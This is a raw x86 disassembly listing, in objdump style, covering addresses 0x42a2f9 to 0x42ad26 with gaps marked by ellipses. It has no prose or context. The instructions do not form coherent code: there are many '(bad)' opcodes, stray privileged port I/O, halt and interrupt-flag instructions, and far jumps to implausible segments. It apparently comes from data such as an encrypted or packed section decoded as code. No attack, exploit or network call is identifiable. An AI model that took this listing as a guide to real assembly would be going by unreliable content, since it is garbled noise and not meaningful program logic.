  42a2f9:	setne  BYTE PTR [ebx+eiz*8]
  42a2fd:	push   ebp
  42a2fe:	repz sbb cl,bl
  42a301:	and    eax,0xf5369c4f
  42a306:	stos   BYTE PTR es:[edi],al
  42a307:	jg     0x42a30a
  42a309:	jl     0x42a31e
  42a30b:	sbb    esi,DWORD PTR [edx]
  42a30d:	or     eax,0x3fed67db
  42a312:	push   ss
  42a313:	jno    0x42a2da
  42a315:	scas   al,BYTE PTR es:[edi]
  42a316:	pop    edx
  42a317:	mov    cs,ecx
  42a319:	not    BYTE PTR [edi+0x6f1110fe]
  42a31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a320:	daa    
  42a321:	ror    BYTE PTR [ecx+0x7a9f8da],1
  42a327:	loop   0x42a355
  42a329:	xor    DWORD PTR [esi+0x36e4004c],esi
  42a32f:	and    ch,BYTE PTR [ecx]
  42a331:	inc    esp
  42a332:	lods   eax,DWORD PTR ds:[esi]
  42a333:	fistp  WORD PTR [eax+0x6208a793]
  42a339:	push   ds
  42a33a:	pusha  
  42a33b:	loop   0x42a381
  42a33d:	cmp    BYTE PTR [esi],dh
  42a33f:	add    eax,0xf73abbf7
  42a344:	cs (bad) 
  42a346:	imul   esi,DWORD PTR [edi+0x15406b64],0xffffffe0
  42a34d:	cmovo  edi,DWORD PTR [edi+0x9a946a6]
  42a354:	cdq    
  42a355:	retf   
  42a356:	mov    edi,fs
  42a358:	sub    BYTE PTR [edx-0x52],0x6
  42a35c:	push   ecx
  42a35d:	add    DWORD PTR [ebx],edi
  42a35f:	outs   dx,BYTE PTR ds:[esi]
  42a360:	pop    ebx
  42a361:	or     eax,0xeaf86552
  42a366:	imul   esi,DWORD PTR [ebp-0xd],0x52
  42a36a:	mov    BYTE PTR [ebx+0x29],bh
  42a36d:	xchg   DWORD PTR [edi],esp
  42a36f:	cs in  eax,dx
  42a371:	sub    al,0x9c
  42a373:	lds    edx,FWORD PTR [eax]
  42a375:	xor    BYTE PTR ds:0xb30d391a,cl
  42a37b:	sti    
  42a37c:	ja     0x42a37c
  42a37e:	(bad)  
  42a37f:	div    DWORD PTR [edi*2+0xd3daf80]
  42a386:	in     eax,dx
  42a387:	jp     0x42a3d9
  42a389:	push   eax
  42a38a:	loop   0x42a3e8
  42a38c:	mov    eax,0x921030
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x8b7f493d
  42a403:	and    eax,0x1c394
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	(bad)  
  42a40d:	sub    eax,0xd363ce3d
  42a412:	in     eax,0x46
  42a414:	in     eax,0x7e
  42a416:	jl     0x42a46b
  42a418:	inc    ebx
  42a419:	adc    eax,0xaebc6a39
  42a41e:	cdq    
  42a41f:	cmp    eax,0xfa4977be
  42a424:	adc    edx,ecx
  42a426:	pop    es
  42a427:	loope  0x42a3de
  42a429:	inc    edi
  42a42a:	mov    ecx,0xed3e4438
  42a42f:	iret   
  42a430:	rol    eax,0x3c
  42a433:	cmp    ah,BYTE PTR [eax-0x38]
  42a436:	ret    0xb9e3
  42a439:	fwait
  42a43a:	pop    dx
  42a43c:	loope  0x42a410
  42a43e:	mov    dl,0x8e
  42a440:	mov    al,ds:0x237be8bc
  42a445:	scas   eax,DWORD PTR es:[edi]
  42a446:	or     DWORD PTR [edx-0x5af8e36b],ebp
  42a44c:	rcr    bh,cl
  42a44e:	inc    edi
  42a44f:	div    BYTE PTR [ecx-0x33]
  42a452:	int3   
  42a453:	push   cs
  42a454:	push   esp
  42a455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a457:	cmp    eax,0xc6224e7a
  42a45c:	aas    
  42a45d:	lods   al,BYTE PTR ds:[esi]
  42a45e:	test   cl,dl
  42a460:	and    edi,edi
  42a462:	ins    BYTE PTR es:[edi],dx
  42a463:	xchg   esi,eax
  42a464:	fs push 0xd7dac9bd
  42a46a:	xor    dl,bh
  42a46c:	outs   dx,BYTE PTR ds:[esi]
  42a46d:	or     al,0xd3
  42a46f:	cmp    al,BYTE PTR [eax+0x2]
  42a472:	jmp    0x42a471
  42a474:	fistp  QWORD PTR [ecx-0x3]
  42a477:	out    0xe6,al
  42a479:	and    DWORD PTR [ebp-0x67],esp
  42a47c:	repnz sbb cl,bl
  42a47f:	ds push esp
  42a481:	les    edx,FWORD PTR [edi-0x4d]
  42a484:	dec    eax
  42a485:	pusha  
  42a486:	xlat   BYTE PTR ds:[ebx]
  42a487:	rcr    eax,1
  42a489:	cmp    ch,ah
  42a48b:	and    DWORD PTR [eax],ecx
  42a48d:	outs   dx,BYTE PTR ds:[esi]
  42a48e:	pop    esi
  42a48f:	lock fldcw WORD PTR [esi-0x5d]
  42a493:	bound  edx,QWORD PTR [esi+0x503a8d98]
  42a499:	and    eax,0x43580b96
  42a49e:	ret    
  42a49f:	push   ss
  42a4a0:	arpl   WORD PTR [edx],bx
  42a4a2:	mov    edi,0x909fb73c
  42a4a7:	aaa    
  42a4a8:	dec    esp
  42a4a9:	inc    ebx
  42a4aa:	mov    al,ds:0xc2793127
  42a4af:	xchg   BYTE PTR [ecx+0x48],bh
  42a4b2:	hlt    
  42a4b3:	cmp    ebx,esi
  42a4b5:	or     al,0x17
  42a4b7:	add    DWORD PTR [ebp+0x75],0xb9888738
  42a4be:	add    DWORD PTR [ecx+0x3d],edx
  42a4c1:	sub    BYTE PTR [edx+0x3d],ch
  42a4c4:	add    al,0x71
  42a4c6:	cs push edx
  42a4c8:	clc    
  42a4c9:	mov    ch,0xeb
  42a4cb:	in     eax,0x17
  42a4cd:	loopne 0x42a52f
  42a4cf:	test   DWORD PTR [eax],esp
  42a4d1:	jge    0x42a545
  42a4d3:	(bad)  
  42a4d4:	cmp    eax,DWORD PTR [ebp+0x7d3e0631]
  42a4da:	mov    ebx,0x8912b94e
  42a4df:	(bad)  
  42a4e0:	cmp    DWORD PTR ds:[ecx+0x9bcdf4c],edi
  42a4e7:	xor    ebx,DWORD PTR [eax+0x1bec1de5]
  42a4ed:	xchg   edi,eax
  42a4ee:	jno    0x42a4bc
  42a4f0:	mov    eax,ds:0x3f45a75c
  42a4f5:	push   0x1763d30a
  42a4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4fb:	jecxz  0x42a4c8
  42a4fd:	into   
  42a4fe:	mov    esi,0x82c08088
  42a503:	sar    al,cl
  42a505:	jne    0x42a489
  42a507:	dec    edi
  42a508:	xor    BYTE PTR [ebx-0x2d],cl
  42a50b:	xor    ecx,DWORD PTR [eax]
  42a50d:	cmp    ecx,edx
  42a50f:	jecxz  0x42a511
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x6787799f
  42a583:	je     0x42a51d
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	jp     0x42a5d2
  42a58e:	loope  0x42a53b
  42a590:	jbe    0x42a594
  42a592:	mul    DWORD PTR [eax*4-0xdc4170f]
  42a599:	xchg   DWORD PTR [eax-0x43f3b07],esi
  42a59f:	mov    edx,0x6d782bc8
  42a5a4:	mov    DWORD PTR [edx],0x791c5340
  42a5aa:	lahf   
  42a5ab:	aaa    
  42a5ac:	xchg   DWORD PTR [esi-0x634fedf],edx
  42a5b2:	and    eax,0x9eea2285
  42a5b7:	lods   al,BYTE PTR ds:[esi]
  42a5b8:	sbb    eax,0x6ba23f9f
  42a5bd:	sbb    esi,DWORD PTR [edx+0x6f000a92]
  42a5c3:	ficom  WORD PTR [ebx+0x2e784372]
  42a5c9:	retf   
  42a5ca:	add    BYTE PTR [edx+0x4],0xa1
  42a5ce:	cs push 0xb2bdc11d
  42a5d4:	mov    cl,0x7e
  42a5d6:	pop    ebp
  42a5d7:	sub    bh,BYTE PTR [eax+0x56aa4c90]
  42a5dd:	test   BYTE PTR [edx+edi*8+0x7f0def34],al
  42a5e4:	and    eax,0x3fdb65ce
  42a5e9:	scas   al,BYTE PTR es:[edi]
  42a5ea:	or     ecx,DWORD PTR [edi+edi*1-0x7d]
  42a5ee:	sub    BYTE PTR [edi+0x15966c5a],ah
  42a5f4:	in     al,dx
  42a5f5:	sbb    esp,ebx
  42a5f7:	jns    0x42a57e
  42a5f9:	xor    ah,ch
  42a5fb:	shl    bl,cl
  42a5fd:	in     eax,0xcd
  42a5ff:	xor    eax,ecx
  42a601:	and    bl,cl
  42a603:	lds    eax,FWORD PTR ds:0x1964d2bd
  42a609:	mov    dl,0xdb
  42a60b:	jle    0x42a644
  42a60d:	mov    DWORD PTR [eax+esi*1],esp
  42a610:	hlt    
  42a611:	test   BYTE PTR [ecx+0x3ad33d13],dh
  42a617:	repz ret 0x13cd
  42a61b:	rcr    BYTE PTR [edi-0x9],cl
  42a61e:	and    eax,0x74962294
  42a623:	xor    eax,0xb996d11e
  42a628:	or     eax,ebx
  42a62a:	frstor [edi]
  42a62c:	cmp    esi,ebp
  42a62e:	and    eax,0x13ae282c
  42a633:	mov    ah,0xb9
  42a635:	jmp    0x42a621
  42a637:	pminub mm5,QWORD PTR [esi+0x79e74875]
  42a63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a63f:	push   cs
  42a640:	add    ah,al
  42a642:	sub    eax,0xb837d7aa
  42a647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a648:	js     0x42a6b3
  42a64a:	lock es jbe 0x42a6b5
  42a64e:	mov    al,ds:0x6c83b3f5
  42a653:	pop    ds
  42a654:	jl     0x42a682
  42a656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a657:	mov    cl,0x18
  42a659:	cmp    cl,dl
  42a65b:	repz or BYTE PTR [ecx-0x2cc8a502],0x7f
  42a663:	ins    BYTE PTR es:[edi],dx
  42a664:	or     al,0x75
  42a666:	mov    edx,0xf3d400ec
  42a66b:	sub    BYTE PTR [eax+esi*2],bl
  42a66e:	xor    al,0x89
  42a670:	cmp    BYTE PTR [ecx-0x28ab761d],dh
  42a676:	mov    al,0xc7
  42a678:	daa    
  42a679:	mov    al,0xbb
  42a67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a67c:	stos   DWORD PTR es:[edi],eax
  42a67d:	and    ch,BYTE PTR [ebp+ebx*2+0xa]
  42a681:	push   ebp
  42a682:	sub    bh,ch
  42a684:	pop    es
  42a685:	sbb    dl,0x50
  42a688:	retf   0xd0db
  42a68b:	lea    edx,[ecx]
  42a68d:	xchg   edx,eax
  42a68e:	mov    ebx,0x92
	...
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x5747ece4],0x9c6e8ea9
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	jno    0x42a6a4
  42a70e:	xor    ebx,DWORD PTR [ebp-0x10630ff]
  42a714:	adc    cx,WORD PTR ds:0x186a3a66
  42a71b:	mov    dh,0xe0
  42a71d:	mov    cl,0xf2
  42a71f:	stc    
  42a720:	div    DWORD PTR [esi+0x540bde4]
  42a726:	cs addr16 inc edi
  42a729:	lea    eax,[esp+edx*2+0x1b]
  42a72d:	and    eax,0xf8812ce0
  42a732:	loope  0x42a784
  42a734:	cld    
  42a735:	sbb    ah,BYTE PTR [ebx]
  42a737:	xchg   ch,al
  42a739:	mov    al,ds:0x668d8641
  42a73e:	push   ss
  42a73f:	dec    eax
  42a740:	mov    bl,0x17
  42a742:	popa   
  42a743:	into   
  42a744:	aam    0x59
  42a746:	mov    fs,WORD PTR [ebx-0x43]
  42a749:	mov    eax,ds:0x82b60764
  42a74e:	add    DWORD PTR [ecx+0x335a6f48],ecx
  42a754:	push   0x6797b29d
  42a759:	push   eax
  42a75a:	mov    ds:0x80fbb922,al
  42a75f:	mov    esp,0x948da3f5
  42a764:	push   eax
  42a765:	fdiv   QWORD PTR ds:0x7b5623d7
  42a76b:	or     eax,0x497182d2
  42a770:	xor    BYTE PTR [edi],al
  42a772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a773:	mov    ch,0x7
  42a775:	inc    eax
  42a776:	xchg   BYTE PTR [ebx+0x2a0b6b7c],bh
  42a77c:	loop   0x42a7bd
  42a77e:	pushf  
  42a77f:	js     0x42a793
  42a781:	jle    0x42a786
  42a783:	jne    0x42a7ab
  42a785:	mov    ebx,0x9e24438c
  42a78a:	pop    ss
  42a78b:	in     eax,dx
  42a78c:	nop
  42a78d:	xchg   DWORD PTR [ecx],esi
  42a78f:	stc    
  42a790:	pop    esi
  42a791:	out    dx,eax
  42a792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a793:	nop
  42a794:	repz aaa 
  42a796:	xchg   ebx,eax
  42a797:	mov    esi,0x81b8b100
  42a79c:	or     dl,BYTE PTR [ebp+ebp*4+0x5d]
  42a7a0:	mov    dl,0x6
  42a7a2:	adc    BYTE PTR [edi-0x20],bl
  42a7a5:	daa    
  42a7a6:	mov    eax,0xcae8a693
  42a7ab:	xlat   BYTE PTR ds:[bx]
  42a7ad:	hlt    
  42a7ae:	mov    esi,0x50258665
  42a7b3:	sub    eax,0x41be6e91
  42a7b8:	sbb    ebx,DWORD PTR [ecx+esi*1]
  42a7bb:	adc    eax,0x4df9bc7a
  42a7c0:	add    eax,0x729e8952
  42a7c5:	push   es
  42a7c6:	xchg   ebp,eax
  42a7c7:	lock data16 jge 0x42a7ed
  42a7cb:	fldenv [esi+0x1ab59cf2]
  42a7d1:	cli    
  42a7d2:	cmp    esp,0xffffff9d
  42a7d5:	arpl   bp,sp
  42a7d7:	imul   esp,ecx,0xef6333b7
  42a7dd:	add    DWORD PTR [ecx+ebx*1-0x47],ecx
  42a7e1:	jmp    0xbd79:0x6d08
  42a7e7:	enter  0xe8d9,0x6e
  42a7eb:	arpl   WORD PTR [ecx+0x61c75aa0],bp
  42a7f1:	push   edi
  42a7f2:	dec    ebp
  42a7f3:	stc    
  42a7f4:	daa    
  42a7f5:	test   DWORD PTR [ecx-0x37],ecx
  42a7f8:	mov    edx,0xa7e29806
  42a7fd:	xchg   BYTE PTR [esi-0x30],ah
  42a800:	mov    edx,0x127e0f32
  42a805:	cmp    BYTE PTR [edi-0x177d8041],dl
  42a80b:	or     eax,esi
  42a80d:	pop    DWORD PTR [esi+0x35]
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x66026c97
  42a882:	jmp    0x20948c6
  42a887:	add    BYTE PTR [ecx+eax*1],al
  42a88a:	add    BYTE PTR [eax],al
  42a88c:	fisubr WORD PTR ds:0x9927c08f
  42a892:	std    
  42a893:	repnz xchg esp,eax
  42a895:	sbb    DWORD PTR [esi+0x74bf4e93],edi
  42a89b:	cmp    dh,BYTE PTR [ebp-0x44c86d6b]
  42a8a1:	jl     0x42a892
  42a8a3:	scas   al,BYTE PTR es:[edi]
  42a8a4:	ret    0xea2c
  42a8a7:	loopne 0x42a8fa
  42a8a9:	inc    edi
  42a8aa:	ret    
  42a8ab:	mov    al,ds:0x3c446b67
  42a8b0:	or     al,BYTE PTR [ebp+0x30]
  42a8b3:	call   0x183b:0xa8d5673f
  42a8ba:	outs   dx,BYTE PTR ds:[esi]
  42a8bb:	mov    WORD PTR [ebx],ds
  42a8bd:	das    
  42a8be:	pop    esi
  42a8bf:	adc    BYTE PTR ds:[edi-0x47],ch
  42a8c3:	out    dx,al
  42a8c4:	pop    esp
  42a8c5:	mov    ecx,0xbd4380c9
  42a8ca:	fisttp QWORD PTR [eax-0x54112529]
  42a8d0:	inc    ebx
  42a8d1:	(bad)  
  42a8d2:	mov    esi,0x15d1e26
  42a8d7:	mov    WORD PTR [eax+0x63],fs
  42a8da:	mov    eax,0xde5bf9ba
  42a8df:	aam    0x33
  42a8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8e2:	xchg   edx,eax
  42a8e3:	push   0xffffffcc
  42a8e5:	fild   DWORD PTR [eax]
  42a8e7:	jne    0x42a8d7
  42a8e9:	(bad)  
  42a8ea:	test   DWORD PTR [eax],0xf2cffb02
  42a8f0:	pop    eax
  42a8f1:	loop   0x42a8a2
  42a8f3:	call   0x4cf70451
  42a8f8:	cld    
  42a8f9:	daa    
  42a8fa:	mov    WORD PTR [ebp+ebx*2-0x65],fs
  42a8fe:	push   cs
  42a8ff:	lods   al,BYTE PTR ds:[esi]
  42a900:	sub    DWORD PTR [eax+eiz*4+0x79],ebp
  42a904:	scas   eax,DWORD PTR es:[edi]
  42a905:	xchg   DWORD PTR [edi+0x2d5192a4],ebx
  42a90b:	or     ecx,DWORD PTR [ebx+0x32aadc62]
  42a911:	scas   eax,DWORD PTR es:[edi]
  42a912:	loop   0x42a8f0
  42a914:	sbb    BYTE PTR [edi],al
  42a916:	out    0x4d,al
  42a918:	fimul  WORD PTR [eax+0x2d]
  42a91b:	mov    ch,0x41
  42a91d:	add    DWORD PTR [edx-0x12],esp
  42a920:	sub    DWORD PTR [esi+0x7569d261],edx
  42a926:	fstp   DWORD PTR [ebp+0x13]
  42a929:	xor    DWORD PTR [ecx+0x257aedcf],0xffffff8a
  42a930:	sbb    al,0xfd
  42a932:	ss mov dl,0x9a
  42a935:	xchg   ebp,eax
  42a936:	dec    edx
  42a937:	repnz mov ecx,0xfcb57a20
  42a93d:	stc    
  42a93e:	mov    al,ds:0x4ec8ed93
  42a943:	pop    ss
  42a944:	adc    al,0x6b
  42a946:	ins    DWORD PTR es:[edi],dx
  42a947:	lock daa 
  42a949:	and    al,0xa1
  42a94b:	push   ebx
  42a94c:	inc    ecx
  42a94d:	sti    
  42a94e:	push   esp
  42a94f:	sub    bh,ch
  42a951:	inc    ebx
  42a952:	mov    DWORD PTR [ecx+0x4d],esp
  42a955:	outs   dx,DWORD PTR ds:[esi]
  42a956:	iret   
  42a957:	inc    edx
  42a958:	arpl   WORD PTR [ebx],bp
  42a95a:	sub    ebx,DWORD PTR [ecx]
  42a95c:	sub    al,0xea
  42a95e:	aas    
  42a95f:	and    BYTE PTR [ebp+0x63b71d1b],dl
  42a965:	xor    DWORD PTR [esi-0xf],edx
  42a968:	mov    ecx,0x7c375ea6
  42a96d:	es aam 0x50
  42a970:	jo     0x42a9ce
  42a972:	pop    ebp
  42a973:	sbb    eax,0xc512c780
  42a978:	sbb    edx,DWORD PTR [ebp+0x12da21e0]
  42a97e:	push   ecx
  42a97f:	xchg   edx,eax
  42a980:	in     al,0x88
  42a982:	in     al,dx
  42a983:	je     0x42a90f
  42a985:	mov    ?,WORD PTR [ecx-0x3a6ae0f3]
  42a98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a98c:	mov    ebp,0x5d2866
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	inc    eax
  42aa01:	cdq    
  42aa02:	pop    es
  42aa03:	cld    
  42aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [esi],bh
  42aa0d:	mov    ds:0x962d2344,al
  42aa12:	inc    esp
  42aa13:	sub    ah,BYTE PTR [edi+0x2fa33ab2]
  42aa19:	(bad)  
  42aa1a:	jbe    0x42a9b0
  42aa1c:	into   
  42aa1d:	nop
  42aa1e:	popf   
  42aa1f:	or     DWORD PTR [ebx],0xffffff8f
  42aa22:	dec    edx
  42aa23:	sar    BYTE PTR [ebx-0x65],cl
  42aa26:	or     dl,dh
  42aa28:	mov    eax,0x35a95065
  42aa2d:	mov    edi,0xb4547ecb
  42aa32:	aas    
  42aa33:	sbb    eax,0x2dd9fa9d
  42aa38:	mov    ebp,0x918255d3
  42aa3d:	retf   
  42aa3e:	stos   BYTE PTR es:[edi],al
  42aa3f:	inc    ebp
  42aa40:	mov    esi,DWORD PTR [edx]
  42aa42:	div    bl
  42aa44:	push   cs
  42aa45:	lea    edx,[esp+ebx*1]
  42aa48:	out    dx,eax
  42aa49:	inc    esi
  42aa4a:	sbb    bh,BYTE PTR [ebx+0x5ef8dba1]
  42aa50:	ds repnz retf 0x6cfe
  42aa55:	loope  0x42aa39
  42aa57:	ret    
  42aa58:	aad    0x45
  42aa5a:	faddp  st(7),st
  42aa5c:	jecxz  0x42aac8
  42aa5e:	out    dx,al
  42aa5f:	fdivr  DWORD PTR [edx+ebp*1-0x24]
  42aa63:	adc    DWORD PTR [ecx-0x33],edx
  42aa66:	mov    bh,0x4b
  42aa68:	jbe    0x42a9fc
  42aa6a:	push   0x63
  42aa6c:	dec    ecx
  42aa6d:	int3   
  42aa6e:	out    0xe0,al
  42aa70:	fdivr  DWORD PTR [eax+0x1e]
  42aa73:	repnz dec esi
  42aa75:	sbb    edx,DWORD PTR [esi-0x7f7bfd1b]
  42aa7b:	ins    BYTE PTR es:[edi],dx
  42aa7c:	stos   DWORD PTR es:[edi],eax
  42aa7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa7e:	jl     0x42aa7c
  42aa80:	jl     0x42aaec
  42aa82:	push   edx
  42aa83:	add    DWORD PTR [edx*2+0xc5a46cb],esp
  42aa8a:	jnp    0x42aa2f
  42aa8c:	cld    
  42aa8d:	cld    
  42aa8e:	pop    edi
  42aa8f:	popa   
  42aa90:	xchg   ecx,eax
  42aa91:	and    DWORD PTR [edi+edi*4+0x3f],edx
  42aa95:	hlt    
  42aa96:	jecxz  0x42aa2f
  42aa98:	jo     0x42aac4
  42aa9a:	sbb    ebx,DWORD PTR [esp+eax*8]
  42aa9d:	pop    edi
  42aa9e:	mov    WORD PTR [edx+0x3c],gs
  42aaa1:	sar    BYTE PTR [ebx+0x0],0x94
  42aaa5:	jbe    0x42aa5a
  42aaa7:	imul   edx,DWORD PTR [ebp-0x28268f09],0x6a36d6c1
  42aab1:	cwde   
  42aab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aab3:	ror    BYTE PTR [eax+0x5e3c26bf],0x62
  42aaba:	(bad)  
  42aabb:	mov    dl,0x6e
  42aabd:	jge    0x42aa90
  42aabf:	push   edx
  42aac0:	das    
  42aac1:	mov    esp,edx
  42aac3:	add    al,0xc9
  42aac5:	out    dx,al
  42aac6:	sbb    cl,dh
  42aac8:	pop    esi
  42aac9:	and    eax,0xee93004f
  42aace:	push   ebx
  42aacf:	daa    
  42aad0:	or     DWORD PTR [eax],0xffffffdf
  42aad3:	ds inc edx
  42aad5:	out    dx,al
  42aad6:	(bad)  
  42aad7:	hlt    
  42aad8:	or     al,0x21
  42aada:	cmp    edx,DWORD PTR [esi-0xb]
  42aadd:	in     eax,0x53
  42aadf:	aam    0x9f
  42aae1:	popa   
  42aae2:	adc    BYTE PTR [edx-0x8],ch
  42aae5:	pushf  
  42aae6:	stos   DWORD PTR es:[edi],eax
  42aae7:	mov    dh,0x2c
  42aae9:	cwde   
  42aaea:	lods   al,BYTE PTR ds:[esi]
  42aaeb:	push   ebx
  42aaec:	out    dx,al
  42aaed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aaee:	dec    ebx
  42aaef:	add    al,0xa7
  42aaf1:	daa    
  42aaf2:	cli    
  42aaf3:	xor    DWORD PTR [ebx-0x19f7d2c2],esi
  42aaf9:	mov    bl,0xe8
  42aafb:	push   esi
  42aafd:	mov    esp,0x72a3031b
  42ab02:	xor    al,0x81
  42ab04:	push   0xdbd471e8
  42ab09:	pushf  
  42ab0a:	cmp    DWORD PTR [ebp-0x10fd7dfd],edx
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	movups xmm3,XMMWORD PTR [eax+esi*1]
  42ab84:	test   al,0xc8
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	fcomip st,st(0)
  42ab8e:	out    0x53,eax
  42ab90:	mov    dl,0xf
  42ab92:	add    DWORD PTR [esi+0x66],esp
  42ab95:	mov    esp,DWORD PTR [edx-0x39]
  42ab98:	stos   BYTE PTR es:[edi],al
  42ab99:	mov    dh,0x31
  42ab9b:	ins    DWORD PTR es:[edi],dx
  42ab9c:	(bad)  
  42ab9d:	out    dx,eax
  42ab9e:	lahf   
  42ab9f:	popf   
  42aba0:	pop    esi
  42aba1:	ret    
  42aba2:	sbb    eax,0x1b653253
  42aba7:	(bad)  
  42aba8:	mov    cl,0x26
  42abaa:	xor    BYTE PTR [edx],0xa2
  42abad:	xor    ch,bl
  42abaf:	pop    esi
  42abb0:	adc    BYTE PTR [eax],0x1d
  42abb3:	in     al,0xb5
  42abb5:	je     0x42ab9d
  42abb7:	xor    al,0xb2
  42abb9:	call   0x93bca22c
  42abbe:	push   edi
  42abbf:	adc    ch,dl
  42abc1:	jb     0x42ac42
  42abc3:	aam    0x80
  42abc5:	dec    ebp
  42abc6:	stos   DWORD PTR es:[edi],eax
  42abc7:	jp     0x42ab8d
  42abc9:	cld    
  42abca:	fstp   TBYTE PTR [ebp+0x65b53df0]
  42abd0:	fwait
  42abd1:	jl     0x42abff
  42abd3:	inc    ecx
  42abd4:	enter  0x360a,0x64
  42abd8:	(bad)  
  42abda:	mov    ch,BYTE PTR [ecx+ebp*1]
  42abdd:	cmp    al,0x95
  42abdf:	jmp    0x2fe:0xc78fd6b1
  42abe6:	lahf   
  42abe7:	jmp    0x4931:0x41669e9e
  42abee:	inc    esp
  42abef:	push   edi
  42abf0:	mov    DWORD PTR [eax+ebp*4],ecx
  42abf3:	call   0x2e5f17c9
  42abf8:	ins    DWORD PTR es:[edi],dx
  42abf9:	lods   al,BYTE PTR ds:[esi]
  42abfa:	or     ebx,DWORD PTR [eax]
  42abfc:	fs inc edx
  42abfe:	sbb    BYTE PTR [ebp-0x45a801a6],ch
  42ac04:	mov    gs,WORD PTR [eax-0x65]
  42ac07:	xchg   esp,eax
  42ac08:	or     eax,0xbc888358
  42ac0d:	mov    esp,0x4a0aee6f
  42ac12:	xor    bl,BYTE PTR [ecx-0x525ce332]
  42ac18:	cld    
  42ac19:	mov    eax,ds:0xf1ed2aeb
  42ac1e:	sub    BYTE PTR [esi-0x4c],0x72
  42ac22:	sahf   
  42ac23:	icebp  
  42ac24:	mov    al,ds:0x2cb64088
  42ac29:	data16 jp 0x42abda
  42ac2c:	push   esp
  42ac2d:	and    al,0xcb
  42ac2f:	add    DWORD PTR [edx+0x45de954b],ebx
  42ac35:	pop    esi
  42ac36:	mov    BYTE PTR [edi-0x22c71709],bh
  42ac3c:	sbb    BYTE PTR [ebx+0x74],ch
  42ac3f:	pop    es
  42ac40:	icebp  
  42ac41:	or     eax,0x8941d23
  42ac46:	(bad)  
  42ac48:	inc    ecx
  42ac49:	xor    eax,0xa2e4d4d5
  42ac4e:	mov    al,dh
  42ac50:	mov    edi,0xce3a7e33
  42ac55:	xor    esp,DWORD PTR [edx-0x7323f820]
  42ac5b:	mov    dh,0xa0
  42ac5d:	jge    0x42acc1
  42ac5f:	xchg   ebp,eax
  42ac60:	mov    ebp,0x2cf54cae
  42ac65:	jo     0x42ac43
  42ac67:	mov    cs,WORD PTR [edi-0x7f41aeb7]
  42ac6d:	mov    ch,0xa4
  42ac6f:	push   ss
  42ac70:	jne    0x42ac68
  42ac72:	add    al,0xba
  42ac74:	ins    DWORD PTR es:[edi],dx
  42ac75:	sub    dl,dh
  42ac77:	jle    0x42abf9
  42ac79:	mov    ecx,0xa2d7ee5e
  42ac7e:	add    al,0xaf
  42ac80:	xchg   DWORD PTR [ecx-0x7face49c],esi
  42ac86:	iret   
  42ac87:	repz not BYTE PTR [esi-0x3f]
  42ac8b:	push   ecx
  42ac8c:	dec    eax
  42ac8d:	or     ah,dl
  42ac8f:	call   0x42ac94
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	xchg   BYTE PTR [ebx-0x365326a0],ch
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	dec    esp
  42ad0d:	sar    DWORD PTR [esi-0x62d1a23d],1
  42ad13:	nop
  42ad14:	cmp    al,0xf0
  42ad16:	div    DWORD PTR [ebx+0x79]
  42ad19:	and    esp,eax
  42ad1b:	adc    ebx,DWORD PTR [edi-0x37]
  42ad1e:	cmp    DWORD PTR [ebp+0x49],edx
  42ad21:	test   bh,al
  42ad23:	lds    eax,FWORD PTR [ecx-0x6]
  42ad26:	mov    ah,BYTE PTR [ecx-0x7342b7c2]
